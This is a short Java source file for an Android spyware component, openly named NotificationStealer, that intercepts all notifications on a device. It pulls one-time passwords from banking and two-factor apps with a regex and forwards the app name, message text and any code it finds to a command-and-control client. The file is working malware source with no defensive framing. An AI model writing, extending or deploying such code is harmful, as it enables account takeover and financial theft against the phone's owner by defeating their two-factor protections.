// lang: Java, file: NotificationStealer.java, target: Android 8+ API 26
// notification listener — intercepts all notifications, pulls OTPs from banking/2FA apps

package com.example.zeca.stealer;

import android.service.notification.*;
import android.app.Notification;
import android.os.Bundle;
import java.util.regex.*;

public class NotificationStealer extends NotificationListenerService {

    // OTP regex — matches "Your code is 123456", "OTP: 4532", etc.
    private static final Pattern OTP_PATTERN =
        Pattern.compile("\\b\\d{4,8}\\b");

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Bundle extras = sbn.getNotification().extras;
        if (extras == null) return;

        String title = extras.getString(Notification.EXTRA_TITLE, "");
        String text  = extras.getString(Notification.EXTRA_TEXT,  "");
        String full  = title + " | " + text;

        StringBuilder sb = new StringBuilder();
        sb.append("PKG: ").append(sbn.getPackageName()).append("\n");
        sb.append("MSG: ").append(full).append("\n");

        // flag if it looks like an OTP
        Matcher m = OTP_PATTERN.matcher(full);
        if (m.find()) {
            sb.append("OTP_CANDIDATE: ").append(m.group()).append("\n");
        }

        C2Client.send(this, "NOTIFICATION", sb.toString());
    }
}